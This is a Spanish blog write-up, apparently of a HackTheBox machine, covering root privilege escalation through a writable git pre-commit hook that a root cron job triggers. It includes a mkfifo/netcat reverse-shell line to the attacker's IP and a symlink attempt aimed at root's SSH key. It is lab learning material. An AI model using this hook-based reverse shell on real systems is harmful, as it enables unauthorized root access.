<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_dev01SH_pspy_gitSYNC.png" style="width: 100%;"/>

Notamos que el usuario con **UID** (User ID) `0` ("[El superusuario debe tener siempre 0](https://es.wikipedia.org/wiki/Identificador_de_usuario)") (o sea, `root`) está ejecutando varias líneas, pero cada línea viene del objeto llamado `/usr/local/bin/git-sync`:

```bash
dev01@opensource:/tmp/test$ cat /usr/local/bin/git-sync 
```

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

Jmmmm, se posiciona en nuestra ruta **home**, mira si hay cambios en los objetos (o si existe uno nuevo) usando `git status`, si los hay, realiza varias tareas: un `add` para añadir los cambios, un `commit` para guardarlos y un `push` para subirlos al repositorio (:

Pues veamos si podemos hacer algo con esto o es otro rabbit-hole...

## Hookeando [📌](#git-hooks) {#git-hooks}

Así de primeras no se me ocurre mucho, únicamente que podríamos crear un link simbólico a por ejemplo `/root/.ssh/id_rsa` y que cuando el programa realice el **add** tome contenido de ese objeto y lo guarde en el link simbólico, posteriormente intentaríamos ver el -contenido- en los git-logs, pero nada, no fue posible hacer funcionar este método:

* [Symlinks in **Git**](http://tdongsi.github.io/blog/2016/02/20/symlinks-in-git/).

Después de mucho tiempo sin entender que hacer, buscando nuevas maneras de explotar la máquina, jugando con `linpeas`, viendo cositas internas, etc., buscando de todo, decidí volver a "empezar" con respecto al objeto llamativo: `/usr/local/bin/git-sync`... 

Con ayuda de la web me fui a búsquedas más básicas, como por ejemplo entender que puedo lograr (en términos de explotación) con cada comando (**commit**, **status**, **push**, etc.) o ver incluso que puedo encontrar en cada objeto que crea **Git** en `.git`, pues opa opa opaaaa:

* [What is `.git` folder and why is it hidden?](https://www.tutorialspoint.com/what-is-git-folder-and-why-is-it-hidden)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_whatISgitFOLDER.png" style="width: 100%;"/>

Ahí nos habla de algo bastante interesante, ¿lo viste también?:

> "**hooks** − This folder contains script files. Git hooks are the scripts that are executed before or after events <u>like commit, push etc.</u>" ~ [tutorialspoint.com](https://www.tutorialspoint.com/what-is-git-folder-and-why-is-it-hidden)

* Más info: [Git Hooks](https://www.atlassian.com/git/tutorials/git-hooks).

Uhhhh, pues el script está ejecutando `commit` y `push`, veamos qué hay en la carpeta **hooks**:

```bash
dev01@opensource:~/.git$ ls -la
total 56
drwxrwxr-x  8 dev01 dev01 4096 Jun 10 16:51 .
drwxr-xr-x  7 dev01 dev01 4096 May 16 12:51 ..
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches
-rw-r--r--  1 dev01 dev01   22 Jun 10 16:51 COMMIT_EDITMSG
-rw-rw-r--  1 dev01 dev01  269 Jun 10 16:50 config
-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description
-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD
-rw-r--r--  1 dev01 dev01   21 May 16 12:50 HEAD
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 hooks
-rw-r--r--  1 root  root   845 Jun 10 15:20 index
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 info
drwxr-xr-x  3 dev01 dev01 4096 May  4 16:35 logs
drwxrwxr-x 43 dev01 dev01 4096 Jun 10 15:20 objects
drwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs
```

```bash
dev01@opensource:~/.git/hooks$ ls -la
total 56
drwxrwxr-x 2 dev01 dev01 4096 May  4 16:35 .
drwxrwxr-x 8 dev01 dev01 4096 Jun 10 16:53 ..
-rwxrwxr-x 1 dev01 dev01  478 Mar 23 01:18 applypatch-msg.sample
-rwxrwxr-x 1 dev01 dev01  896 Mar 23 01:18 commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 3327 Mar 23 01:18 fsmonitor-watchman.sample
-rwxrwxr-x 1 dev01 dev01  189 Mar 23 01:18 post-update.sample
-rwxrwxr-x 1 dev01 dev01  424 Mar 23 01:18 pre-applypatch.sample
-rwxrwxr-x 1 dev01 dev01 1642 Mar 23 01:18 pre-commit.sample
-rwxrwxr-x 1 dev01 dev01 1492 Mar 23 01:18 prepare-commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 1348 Mar 23 01:18 pre-push.sample
-rwxrwxr-x 1 dev01 dev01 4898 Mar 23 01:18 pre-rebase.sample
-rwxrwxr-x 1 dev01 dev01  544 Mar 23 01:18 pre-receive.sample
-rwxrwxr-x 1 dev01 dev01 3610 Mar 23 01:18 update.sample
```

Hay varios objetos `.sample`, veamos `pre-commit.sample`, ya que está relacionado con **commit** (ya se entenderá por qué ese y no **commit-msg.sample**):

```bash
dev01@opensource:~/.git/hooks$ cat pre-commit.sample
```

```bash
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
        against=HEAD
else
        ...
...
```

El contenido poco importa, pero si vuelves a leer su cabecera hay dos cosas locas y una le da fuerza a la otra:

> An example hook script to verify what is about to be committed.
> Called by "`git commit`" with no arguments.

Opa, este script valida el **commit** antes de ser generado, puede ser interesante, ya que nuestro `git commit` únicamente tiene el mensaje que se le agregara, pero no tiene argumentos...

> To enable this hook, **rename this file** to "`pre-commit`".

Y puede ser activado (o sea, que cada que se haga un `commit` sea llamado) simplemente quitando el **.sample** del nombre. 

Jm, esto hace que exista la posibilidad de que cada vez que `root` ejecute `/usr/local/bin/git-sync` y haga el **commit** pueda llegar a este objeto y ejecutarlo, ¿no? Y si le sumamos que tenemos permisos de escritura, pues... ¿Se entiende?

Modificamos nombre del archivo `.sample`:

```bash
dev01@opensource:~/.git/hooks$ mv pre-commit.sample pre-commit
```

Y si nos fijamos en el resultado de `pspy` notamoooooooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_dev01SH_pspy_preCOMMIT.png" style="width: 100%;"/>

SE EJECUTA EL SCRIPTTTTTTTT! Así que lo único que debemos hacer es modificarlo con alguna línea juguetona y sería ejecutada como el usuario `root`, de una hagamos una reverse shell:

Levantamos servidor:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Y agregamos nuestra línea al archivo (:

```bash
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 4433 >/tmp/f
...
```

YyyyyYyyyyyYYYYYy si esperamos un momento a que la tarea se ejecute (con ayuda del **pspy** sabemos que es cada minuto) vemos en nuestro serveeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_rootRevSH.png" style="width: 100%;"/>

Tenemos una consola como el usuario `root`, [la hacemos que sea bonita](https://lanzt.gitbook.io/cheatsheet-pentest/tty) y vemos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471flags.png" style="width: 100%;"/>

Y listos nos vaaaaamos!

...

Una interesante máquina, el path hacia el user fue lindo lindo y el jugueteo con `git` me gusto también, así que perfecto!

Pues nos charlamos otro día, pero ojo, a seguir rompiendoooooo de todoooooo!